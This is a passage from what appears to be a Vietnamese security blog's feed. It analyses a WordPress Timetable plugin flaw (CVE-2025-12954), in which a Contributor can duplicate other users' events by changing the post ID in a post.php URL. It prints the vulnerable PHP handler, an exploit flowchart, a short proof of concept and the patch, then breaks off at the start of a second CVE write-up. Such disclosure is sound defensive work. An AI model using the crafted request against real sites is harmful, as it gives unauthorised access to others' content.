&amp;#39;mptt_duplicate_event&amp;#39; )&#xA;            ),&#xA;            admin_url( &amp;#39;post.php&amp;#39; )&#xA;        );&#xA;&#xA;        $actions[&amp;#39;duplicate&amp;#39;] = &amp;#39;&amp;lt;a href=&amp;#34;&amp;#39; . $action_url . &amp;#39;&amp;#34; aria-label=&amp;#34;&amp;#39; .&#xA;            __(&amp;#39;Duplicate&amp;#39;, &amp;#39;mp-timetable&amp;#39;) . &amp;#39;&amp;#34; rel=&amp;#34;permalink&amp;#34;&amp;gt;&amp;#39; . __(&amp;#39;Duplicate&amp;#39;, &amp;#39;mp-timetable&amp;#39;) . &amp;#39;&amp;lt;/a&amp;gt;&amp;#39;;&#xA;    }&#xA;&#xA;    return $actions;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm này dùng hook &lt;code&gt;post_row_actions&lt;/code&gt; để &lt;strong&gt;thêm link Duplicate&lt;/strong&gt; vào danh sách action của mỗi bài viết trong admin.&lt;/p&gt;&#xA;&lt;p&gt;Link chỉ hiển thị khi bài viết đúng &lt;code&gt;post_type&lt;/code&gt; và người dùng có quyền &lt;code&gt;edit_posts&lt;/code&gt; (Contributor+).&#xA;URL được tạo trỏ đến &lt;code&gt;post.php&lt;/code&gt; kèm &lt;code&gt;post&lt;/code&gt; (ID bài viết), &lt;code&gt;action&lt;/code&gt; (&lt;code&gt;mptt_duplicate_event&lt;/code&gt;) và &lt;code&gt;_wpnonce&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Khi người dùng click &lt;strong&gt;Duplicate&lt;/strong&gt;, WordPress sẽ kích hoạt hook &lt;code&gt;post_action_mptt_duplicate_event&lt;/code&gt; để xử lý việc nhân bản bài viết.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-21-cve-2025-12954/duplicate.png&#34; title=&#34;Link duplicate trong mỗi Event&#34; data-thumbnail=&#34;/posts/2025-12-21-cve-2025-12954/duplicate.png&#34; data-sub-html=&#34;&lt;h2&gt;Duplicate&lt;/h2&gt;&lt;p&gt;Link duplicate trong mỗi Event&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-21-cve-2025-12954/duplicate.png&#39; alt=&#34;Duplicate&#34; height=&#34;483&#34; width=&#34;875&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Link duplicate trong mỗi Event&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Callback &lt;code&gt;post_action_mptt_duplicate_event&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function post_action_mptt_duplicate_event( $post_id ) {&#xA;    global $wpdb;&#xA;&#xA;    $post_type = &amp;#39;&amp;#39;;&#xA;&#xA;    if ( $post_id ) {&#xA;        $post = get_post( $post_id );&#xA;    }&#xA;&#xA;    if ( $post ) {&#xA;        $post_type = $post-&amp;gt;post_type;&#xA;    }&#xA;&#xA;    if ( $post_type !== $this-&amp;gt;post_type ) {&#xA;        wp_die( __( &amp;#39;A post type mismatch has been detected.&amp;#39;, &amp;#39;mp-timetable&amp;#39; ), __( &amp;#39;Sorry, you are not allowed to edit this item.&amp;#39;, &amp;#39;mp-timetable&amp;#39; ), 400 );&#xA;    }&#xA;&#xA;    $nonce = sanitize_key( $_REQUEST[&amp;#39;_wpnonce&amp;#39;] );&#xA;&#xA;    if ( wp_verify_nonce( $nonce, &amp;#39;mptt_duplicate_event&amp;#39; ) &amp;amp;&amp;amp; current_user_can(&amp;#39;edit_posts&amp;#39;) ) {&#xA;&#xA;        $current_user = wp_get_current_user();&#xA;        $new_post_author = $current_user-&amp;gt;ID;&#xA;&#xA;        /*&#xA;            * new post data array&#xA;            */&#xA;        $args = array(&#xA;            &amp;#39;comment_status&amp;#39; =&amp;gt; $post-&amp;gt;comment_status,&#xA;            &amp;#39;ping_status&amp;#39;    =&amp;gt; $post-&amp;gt;ping_status,&#xA;            &amp;#39;post_author&amp;#39;    =&amp;gt; $new_post_author,&#xA;            &amp;#39;post_content&amp;#39;   =&amp;gt; $post-&amp;gt;post_content,&#xA;            &amp;#39;post_excerpt&amp;#39;   =&amp;gt; $post-&amp;gt;post_excerpt,&#xA;            &amp;#39;post_name&amp;#39;      =&amp;gt; $post-&amp;gt;post_name,&#xA;            &amp;#39;post_parent&amp;#39;    =&amp;gt; $post-&amp;gt;post_parent,&#xA;            &amp;#39;post_password&amp;#39;  =&amp;gt; $post-&amp;gt;post_password,&#xA;            &amp;#39;post_status&amp;#39;    =&amp;gt; &amp;#39;draft&amp;#39;,&#xA;            // translators: New post title of the duplicated post&#xA;            &amp;#39;post_title&amp;#39;     =&amp;gt; sprintf( __(&amp;#39;%s - Copy&amp;#39;, &amp;#39;mp-timetable&amp;#39;), $post-&amp;gt;post_title ),&#xA;            &amp;#39;post_type&amp;#39;      =&amp;gt; $post-&amp;gt;post_type,&#xA;            &amp;#39;to_ping&amp;#39;        =&amp;gt; $post-&amp;gt;to_ping,&#xA;            &amp;#39;menu_order&amp;#39;     =&amp;gt; $post-&amp;gt;menu_order&#xA;        );&#xA;&#xA;        /*&#xA;            * insert the post by wp_insert_post() function&#xA;            */&#xA;        $new_post_id = wp_insert_post( $args );&#xA;&#xA;        if( is_wp_error($new_post_id) ) {&#xA;            wp_die( $post_id-&amp;gt;get_error_message() );&#xA;        }&#xA;&#xA;        /*&#xA;            * get all current post terms and set them to the new post draft&#xA;            */&#xA;        $taxonomies = get_object_taxonomies($post-&amp;gt;post_type);&#xA;        foreach ($taxonomies as $taxonomy) {&#xA;            $post_terms = wp_get_object_terms($post_id, $taxonomy, array(&amp;#39;fields&amp;#39; =&amp;gt; &amp;#39;slugs&amp;#39;));&#xA;            wp_set_object_terms($new_post_id, $post_terms, $taxonomy, false);&#xA;        }&#xA;&#xA;        /*&#xA;            * duplicate all post meta&#xA;            */&#xA;        $post_meta_keys = \get_post_custom_keys( $post_id );&#xA;&#xA;        if ( ! empty( $post_meta_keys ) ) {&#xA;&#xA;            $meta_excludelist = [&#xA;                &amp;#39;_edit_lock&amp;#39;,&#xA;                &amp;#39;_edit_last&amp;#39;,&#xA;                &amp;#39;_wp_old_slug&amp;#39;&#xA;            ];&#xA;&#xA;            $meta_keys = \array_diff( $post_meta_keys, $meta_excludelist );&#xA;&#xA;            foreach ( $meta_keys as $meta_key ) {&#xA;                $meta_values = \get_post_custom_values( $meta_key, $post_id );&#xA;&#xA;                // Clear existing meta data&#xA;                \delete_post_meta( $new_post_id, $meta_key );&#xA;&#xA;                foreach ( $meta_values as $meta_value ) {&#xA;                    $meta_value = \maybe_unserialize( $meta_value );&#xA;                    \add_post_meta( $new_post_id, $meta_key, addslashes( $meta_value ) );&#xA;                }&#xA;            }&#xA;&#xA;        }&#xA;&#xA;        /*&#xA;            * duplicate timeslots in custom BD&#xA;            */&#xA;        $timeslots = $this-&amp;gt;wpdb-&amp;gt;get_results( &#xA;            $this-&amp;gt;wpdb-&amp;gt;prepare(&amp;#34;SELECT * FROM {$this-&amp;gt;table_name} WHERE event_id = %d&amp;#34;, $post_id ), &#xA;        OBJECT );&#xA;&#xA;        if ( !empty($timeslots) ) {&#xA;&#xA;            foreach ( $timeslots as $timeslot ) {&#xA;                $wpdb-&amp;gt;insert(&#xA;                    $this-&amp;gt;table_name,&#xA;                    array(&#xA;                        &amp;#39;column_id&amp;#39;   =&amp;gt; $timeslot-&amp;gt;column_id,&#xA;                        &amp;#39;event_id&amp;#39;    =&amp;gt; $new_post_id,&#xA;                        &amp;#39;event_start&amp;#39; =&amp;gt; date( &amp;#39;H:i&amp;#39;, strtotime( $timeslot-&amp;gt;event_start ) ),&#xA;                        &amp;#39;event_end&amp;#39;   =&amp;gt; date( &amp;#39;H:i&amp;#39;, strtotime( $timeslot-&amp;gt;event_end ) ),&#xA;                        &amp;#39;user_id&amp;#39;     =&amp;gt; $timeslot-&amp;gt;user_id,&#xA;                        &amp;#39;description&amp;#39; =&amp;gt; $timeslot-&amp;gt;description&#xA;                    )&#xA;                );&#xA;            }&#xA;        }&#xA;&#xA;        /*&#xA;            * redirect to the edit post screen for the new draft&#xA;            */&#xA;        wp_safe_redirect( get_edit_post_link( $new_post_id, &amp;#39;&amp;#39; ) );&#xA;        exit();&#xA;&#xA;    } else {&#xA;        wp_die( __( &amp;#39;Sorry, you are not allowed to edit this item.&amp;#39; ) );&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm này thực hiện duplicate của post có post id là &lt;code&gt;$post_id&lt;/code&gt;, tuy nhiên:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( wp_verify_nonce( $nonce, &amp;#39;mptt_duplicate_event&amp;#39; ) &amp;amp;&amp;amp; current_user_can(&amp;#39;edit_posts&amp;#39;) ) {&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Đây là nguyên nhân chính dẫn tới IDOR (Insecure Direct Object Reference).&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;code&gt;edit_posts&lt;/code&gt; là quyền &lt;strong&gt;chung&lt;/strong&gt;, không gắn với &lt;strong&gt;bài viết cụ thể&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Contributor trở lên đều có quyền này&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Không có kiểm tra:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;bài viết có thuộc user hiện tại không&lt;/li&gt;&#xA;&lt;li&gt;user có quyền chỉnh sửa &lt;strong&gt;post_id cụ thể&lt;/strong&gt; hay không&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;$post = get_post( $post_id );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Bài viết được lấy trực tiếp từ &lt;code&gt;$post_id&lt;/code&gt; truyền qua URL mà &lt;strong&gt;không ràng buộc quyền sở hữu&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;post.php?action=mptt_duplicate_event&amp;amp;post=123&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Chỉ cần đoán hoặc thay đổi &lt;code&gt;post&lt;/code&gt; ID trong URL, người dùng có &lt;code&gt;edit_posts&lt;/code&gt; vẫn có thể:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;duplicate bài viết của người khác&lt;/li&gt;&#xA;&lt;li&gt;duplicate bài đã publish&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Vì WordPress &lt;strong&gt;không tự kiểm tra quyền ở hook &lt;code&gt;post_action_*&lt;/code&gt;&lt;/strong&gt;, toàn bộ việc kiểm soát truy cập phụ thuộc vào đoạn &lt;code&gt;current_user_can()&lt;/code&gt; trong plugin.&lt;/p&gt;&#xA;&lt;p&gt;Thay vì sử dụng &lt;code&gt;edit_posts&lt;/code&gt;, bản vá đã chuyển sang kiểm tra quyền trên từng đối tượng cụ thể bằng meta capability:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;current_user_can( &amp;#39;edit_post&amp;#39;, $post_id )&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Cách kiểm tra này buộc WordPress phải xác minh:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Người dùng có quyền chỉnh sửa bài viết được tham chiếu bởi &lt;code&gt;$post_id&lt;/code&gt; hay không&lt;/li&gt;&#xA;&lt;li&gt;Bài viết có thuộc về người dùng hiện tại không&lt;/li&gt;&#xA;&lt;li&gt;Trạng thái bài viết (draft, pending, published, private)&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Nhờ đó, người dùng không còn có thể tự ý thay đổi post ID trong URL để duplicate bài viết của người khác, và lỗ hổng &lt;strong&gt;IDOR&lt;/strong&gt; được khắc phục.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-21-cve-2025-12954/diff.png&#34; title=&#34;Sự thay đổi của bản vá&#34; data-thumbnail=&#34;/posts/2025-12-21-cve-2025-12954/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;Sự thay đổi của bản vá&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-21-cve-2025-12954/diff.png&#39; alt=&#34;Diff&#34; height=&#34;679&#34; width=&#34;1788&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Sự thay đổi của bản vá&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;&#xA;A[&amp;#34;Authenticated user (Contributor&amp;#43;)&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Click Duplicate link or craft URL manually&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;Request: /wp-admin/post.php?action=mptt_duplicate_event&amp;amp;post={target_post_id}&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;WordPress loads post.php&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;do_action(&amp;#39;post_action_mptt_duplicate_event&amp;#39;, post_id)&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;post_action_mptt_duplicate_event(post_id)&amp;#34;]&#xA;F --&amp;gt; G[&amp;#34;get_post(post_id) without ownership check&amp;#34;]&#xA;G --&amp;gt; H[&amp;#34;Check nonce &amp;#43; current_user_can(&amp;#39;edit_posts&amp;#39;)&amp;#34;]&#xA;H --&amp;gt; I[&amp;#34;Permission granted (generic capability)&amp;#34;]&#xA;I --&amp;gt; J[&amp;#34;Duplicate target post (content, meta, taxonomy, custom table)&amp;#34;]&#xA;J --&amp;gt; K[&amp;#34;Create new draft owned by attacker&amp;#34;]&#xA;K --&amp;gt; L[&amp;#34;Redirect to edit screen of duplicated post&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Login bằng Contributor account&lt;/li&gt;&#xA;&lt;li&gt;Truy cập &lt;code&gt;Timetable&lt;/code&gt; &amp;gt; &lt;code&gt;Events&lt;/code&gt; và click &lt;code&gt;Duplicate&lt;/code&gt; của event bất kỳ&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-21-cve-2025-12954/poc.gif&#34; title=&#34;PoC&#34; data-thumbnail=&#34;/posts/2025-12-21-cve-2025-12954/poc.gif&#34; data-sub-html=&#34;&lt;h2&gt;PoC&lt;/h2&gt;&lt;p&gt;PoC&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-21-cve-2025-12954/poc.gif&#39; alt=&#34;PoC&#34; height=&#34;644&#34; width=&#34;1916&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;PoC&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng xuất phát từ việc plugin chỉ kiểm tra quyền tổng quát &lt;code&gt;edit_posts&lt;/code&gt; khi duplicate event, thay vì kiểm tra quyền trên &lt;strong&gt;bài viết cụ thể&lt;/strong&gt;. Do hook &lt;code&gt;post_action_*&lt;/code&gt; không được WordPress tự động bảo vệ, người dùng có quyền thấp (Contributor) có thể thay đổi &lt;code&gt;post&lt;/code&gt; ID trong URL để duplicate event mà họ không sở hữu, dẫn tới IDOR. Bản vá khắc phục bằng cách sử dụng meta capability &lt;code&gt;edit_post&lt;/code&gt;, buộc WordPress xác minh quyền trên từng post.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;edit_posts&lt;/code&gt; không phù hợp để bảo vệ thao tác trên post cụ thể&lt;/li&gt;&#xA;&lt;li&gt;Nonce không thay thế cho kiểm tra quyền&lt;/li&gt;&#xA;&lt;li&gt;ID lấy từ request luôn là user-controlled&lt;/li&gt;&#xA;&lt;li&gt;Luôn dùng &lt;code&gt;current_user_can( &#39;edit_post&#39;, $post_id )&lt;/code&gt; khi thao tác trên post&lt;/li&gt;&#xA;&lt;li&gt;Hook &lt;code&gt;post_action_*&lt;/code&gt; yêu cầu plugin tự kiểm soát authorization&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/idor.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;IDOR&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/mp-timetable/vulnerability/wordpress-timetable-and-event-schedule-plugin-2-4-16-contributor-event-disclosure-via-idor-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Timetable and Event Schedule Plugin &amp;lt;= 2.4.15 is vulnerable to Insecure Direct Object References (IDOR)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-67985 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-12-20-cve-2025-67985/</link>
      <pubDate>Sat, 20 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-12-20-cve-2025-67985/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-20-cve-2025-67985/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng &lt;strong&gt;bỏ qua kiểm soát phân quyền thông qua khóa do người dùng kiểm soát&lt;/strong&gt; trong plugin &lt;strong&gt;Document Library Lite&lt;/strong&gt; của &lt;strong&gt;Barn2 Plugins&lt;/strong&gt; cho phép khai thác &lt;strong&gt;các mức bảo mật kiểm soát truy cập được cấu hình không đúng&lt;/strong&gt;.&#xA;Lỗ hổng này ảnh hưởng đến &lt;strong&gt;Document Library Lite&lt;/strong&gt; từ &lt;strong&gt;không xác định&lt;/strong&gt; đến &lt;strong&gt;phiên bản 1.1.7 trở xuống&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-67985&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-67985&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Insecure direct object references (IDOR)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.1.7&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.2.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5.3)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/document-library-lite/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Document Library Lite Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 